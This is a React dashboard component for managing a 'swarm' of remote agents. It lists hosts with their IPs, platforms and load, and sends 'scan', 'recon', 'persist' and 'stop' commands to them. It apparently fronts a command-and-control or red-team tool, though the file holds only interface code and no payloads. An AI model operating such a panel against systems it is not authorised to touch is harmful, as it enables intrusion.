'use client';
import { useState, useEffect, useCallback } from 'react';
import {
  ServerIcon,
  MagnifyingGlassIcon,
  ArrowPathIcon,
  PlayIcon,
  StopIcon,
  CommandLineIcon,
  SignalIcon,
} from '@heroicons/react/24/outline';
import { SwarmAgent } from '@/types';
import {
  fetchSwarmAgents,
  fetchSwarmIntelligence,
  scaleSwarm,
  sendCommand,
  statusColor,
  platformColor,
  formatUptime,
  healthColor,
} from '@/lib/api';

export default function Agents() {
  const [agents, setAgents] = useState<SwarmAgent[]>([]);
  const [intel, setIntel] = useState<{ swarm_health: string; success_rate: number; total_agents: number; active_agents: number; operations_last_hour: number } | null>(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState('');
  const [search, setSearch] = useState('');
  const [platformFilter, setPlatformFilter] = useState('all');
  const [scaleCount, setScaleCount] = useState(8);
  const [actionResult, setActionResult] = useState('');
  const [lastUpdated, setLastUpdated] = useState<Date>(new Date());

  const fetchAll = useCallback(async () => {
    try {
      const [rawAgents, rawIntel] = await Promise.all([
        fetchSwarmAgents(),
        fetchSwarmIntelligence(),
      ]);
      setAgents(rawAgents);
      setIntel(rawIntel);
      setLastUpdated(new Date());
      setError('');
    } catch (err) {
      setError(err instanceof Error ? err.message : 'Failed to fetch agents');
    } finally {
      setLoading(false);
    }
  }, []);

  useEffect(() => {
    fetchAll();
    const interval = setInterval(fetchAll, 5000);
    return () => clearInterval(interval);
  }, [fetchAll]);

  const handleScale = async () => {
    try {
      await scaleSwarm(scaleCount);
      setActionResult(`✓ Swarm scaled to ${scaleCount} agents`);
      fetchAll();
    } catch {
      setActionResult('✗ Scale failed');
    }
    setTimeout(() => setActionResult(''), 4000);
  };

  const handleCommand = async (type: string, agentId?: string) => {
    try {
      const result = await sendCommand({ command: type, agent_id: agentId });
      setActionResult(`✓ Command '${type}' sent${agentId ? ` to ${agentId.slice(-8)}` : ' to all'}`);
    } catch {
      setActionResult(`✗ Command failed`);
    }
    setTimeout(() => setActionResult(''), 4000);
  };

  const platforms = ['all', ...Array.from(new Set(agents.map(a => a.platform)))];

  const filtered = agents.filter(a => {
    const matchSearch = !search || a.hostname.toLowerCase().includes(search.toLowerCase()) || a.ip.includes(search) || a.id.includes(search);
    const matchPlatform = platformFilter === 'all' || a.platform === platformFilter;
    return matchSearch && matchPlatform;
  });

  return (
    <div className="space-y-6">

      {/* Header + Controls */}
      <div className="flex flex-col md:flex-row md:items-center justify-between gap-4">
        <div>
          <h2 className="text-xl font-bold text-white">Swarm Agents</h2>
          <p className="text-sm text-gray-400 mt-0.5">
            {agents.length} registered · last updated {lastUpdated.toLocaleTimeString()}
          </p>
        </div>
        <div className="flex items-center space-x-3">
          {actionResult && (
            <span className={`text-xs font-mono px-3 py-1 rounded border ${actionResult.startsWith('✓') ? 'text-green-400 border-green-700 bg-green-900/20' : 'text-red-400 border-red-700 bg-red-900/20'}`}>
              {actionResult}
            </span>
          )}
          <button onClick={fetchAll} className="flex items-center space-x-1 px-3 py-2 bg-gray-800 hover:bg-gray-700 text-gray-300 rounded-lg text-sm transition-colors border border-gray-700">
            <ArrowPathIcon className="w-4 h-4" />
            <span>Refresh</span>
          </button>
        </div>
      </div>

      {/* Intel Summary */}
      {intel && (
        <div className="grid grid-cols-2 md:grid-cols-5 gap-3">
          {[
            { label: 'Total Agents', value: intel.total_agents, color: 'text-white' },
            { label: 'Active', value: intel.active_agents, color: 'text-green-400' },
            { label: 'Ops / Hour', value: intel.operations_last_hour, color: 'text-serverroot-400' },
            { label: 'Success Rate', value: `${Math.round(intel.success_rate * 100)}%`, color: intel.success_rate > 0.7 ? 'text-green-400' : 'text-yellow-400' },
            { label: 'Swarm Health', value: intel.swarm_health.toUpperCase(), color: healthColor(intel.swarm_health) },
          ].map(item => (
            <div key={item.label} className="cyber-card py-3 text-center">
              <p className="text-xs text-gray-500 uppercase tracking-wider">{item.label}</p>
              <p className={`text-lg font-bold mt-1 ${item.color}`}>{item.value}</p>
            </div>
          ))}
        </div>
      )}

      {/* Swarm Controls */}
      <div className="cyber-card">
        <h3 className="text-sm font-semibold text-gray-300 mb-3 flex items-center">
          <CommandLineIcon className="w-4 h-4 mr-2 text-serverroot-400" />
          Swarm Controls
        </h3>
        <div className="flex flex-wrap gap-3 items-center">
          <div className="flex items-center space-x-2">
            <label className="text-xs text-gray-400">Scale to:</label>
            <input
              type="number"
              value={scaleCount}
              onChange={e => setScaleCount(Number(e.target.value))}
              className="w-16 bg-gray-800 border border-gray-700 rounded px-2 py-1 text-white text-sm"
              min={1} max={50}
            />
            <button onClick={handleScale} className="px-3 py-1.5 bg-serverroot-600 hover:bg-serverroot-500 text-white rounded text-sm font-medium transition-colors">
              Scale
            </button>
          </div>
          <div className="flex space-x-2">
            {['scan', 'recon', 'persist', 'stop'].map(cmd => (
              <button
                key={cmd}
                onClick={() => handleCommand(cmd)}
                className="px-3 py-1.5 bg-gray-800 hover:bg-gray-700 border border-gray-700 text-gray-300 hover:text-white rounded text-sm transition-colors capitalize"
              >
                {cmd === 'stop' ? '⏹ Stop All' : `▶ ${cmd}`}
              </button>
            ))}
          </div>
        </div>
      </div>

      {/* Search + Filter */}
      <div className="flex flex-col sm:flex-row gap-3">
        <div className="relative flex-1">
          <MagnifyingGlassIcon className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-500" />
          <input
            type="text"
            value={search}
            onChange={e => setSearch(e.target.value)}
            placeholder="Search by hostname, IP, or agent ID..."
            className="w-full bg-gray-800 border border-gray-700 rounded-lg pl-9 pr-4 py-2 text-white text-sm focus:outline-none focus:border-serverroot-500"
          />
        </div>
        <select
          value={platformFilter}
          onChange={e => setPlatformFilter(e.target.value)}
          className="bg-gray-800 border border-gray-700 rounded-lg px-3 py-2 text-white text-sm focus:outline-none focus:border-serverroot-500"
        >
          {platforms.map(p => (
            <option key={p} value={p}>{p === 'all' ? 'All Platforms' : p}</option>
          ))}
        </select>
      </div>

      {/* Agent List */}
      {loading ? (
        <div className="text-center py-16 text-gray-500">
          <SignalIcon className="w-10 h-10 mx-auto mb-3 animate-pulse" />
          <p>Connecting to swarm...</p>
        </div>
      ) : error ? (
        <div className="cyber-card border-red-700/40 bg-red-900/10 text-center py-10">
          <p className="text-red-400 font-mono text-sm">⚠ {error}</p>
          <button onClick={fetchAll} className="mt-3 px-4 py-2 bg-red-800/30 hover:bg-red-700/30 text-red-300 rounded text-sm">Retry</button>
        </div>
      ) : filtered.length === 0 ? (
        <div className="text-center py-16 text-gray-500">
          <ServerIcon className="w-10 h-10 mx-auto mb-3 opacity-30" />
          <p>{agents.length === 0 ? 'No agents registered yet' : 'No agents match your filter'}</p>
        </div>
      ) : (
        <div className="space-y-3">
          <p className="text-xs text-gray-500">Showing {filtered.length} of {agents.length} agents</p>
          {filtered.map(agent => (
            <div key={agent.id} className="cyber-card hover:border-serverroot-500/40 transition-all duration-200">
              <div className="flex flex-col md:flex-row md:items-center justify-between gap-4">
                <div className="flex items-center space-x-4">
                  <div className="relative">
                    <ServerIcon className="w-8 h-8 text-gray-500" />
                    <div className={`absolute -top-0.5 -right-0.5 w-2.5 h-2.5 rounded-full ${agent.status === 'active' ? 'bg-green-400 animate-pulse' : 'bg-gray-600'}`}></div>
                  </div>
                  <div>
                    <div className="flex items-center space-x-2">
                      <p className="text-white font-mono font-semibold">{agent.hostname}</p>
                      <span className={`text-xs px-2 py-0.5 rounded-full border ${statusColor(agent.status)}`}>{agent.status}</span>
                      {agent.role === 'leader' && <span className="text-xs px-2 py-0.5 rounded-full bg-yellow-400/10 text-yellow-400 border border-yellow-400/30">LEADER</span>}
                    </div>
                    <div className="flex items-center space-x-3 mt-1">
                      <span className="text-xs text-gray-500 font-mono">{agent.ip}</span>
                      <span className={`text-xs font-medium ${platformColor(agent.platform)}`}>{agent.platform}</span>
                      <span className="text-xs text-gray-600 font-mono">#{agent.id.slice(-8)}</span>
                    </div>
                  </div>
                </div>

                <div className="grid grid-cols-4 gap-4 text-center text-xs md:w-auto w-full">
                  <div>
                    <p className="text-gray-500">Tasks</p>
                    <p className="text-white font-bold text-base">{agent.tasks_completed}</p>
                  </div>
                  <div>
                    <p className="text-gray-500">Load</p>
                    <p className={`font-bold text-base ${agent.load > 0.85 ? 'text-red-400' : agent.load > 0.6 ? 'text-yellow-400' : 'text-green-400'}`}>
                      {Math.round(agent.load * 100)}%
                    </p>
                  </div>
                  <div>
                    <p className="text-gray-500">Caps</p>
                    <p className="text-white font-bold text-base">{agent.capabilities?.length ?? 0}</p>
                  </div>
                  <div>
                    <p className="text-gray-500">Last Seen</p>
                    <p className="text-gray-300 text-xs">{new Date(agent.last_seen).toLocaleTimeString()}</p>
                  </div>
                </div>

                <div className="flex space-x-2">
                  <button onClick={() => handleCommand('scan', agent.id)} className="p-1.5 text-gray-400 hover:text-serverroot-400 hover:bg-serverroot-400/10 rounded transition-colors" title="Scan">
                    <PlayIcon className="w-4 h-4" />
                  </button>
                  <button onClick={() => handleCommand('stop', agent.id)} className="p-1.5 text-gray-400 hover:text-red-400 hover:bg-red-400/10 rounded transition-colors" title="Stop">
                    <StopIcon className="w-4 h-4" />
                  </button>
                </div>
              </div>

              {/* Capabilities */}
              {agent.capabilities && agent.capabilities.length > 0 && (
                <div className="mt-3 pt-3 border-t border-gray-800 flex flex-wrap gap-2">
                  {agent.capabilities.map(cap => (
                    <span key={cap} className="text-xs px-2 py-0.5 bg-gray-800 text-gray-400 rounded border border-gray-700">{cap}</span>
                  ))}
                </div>
              )}
            </div>
          ))}
        </div>
      )}
    </div>
  );
}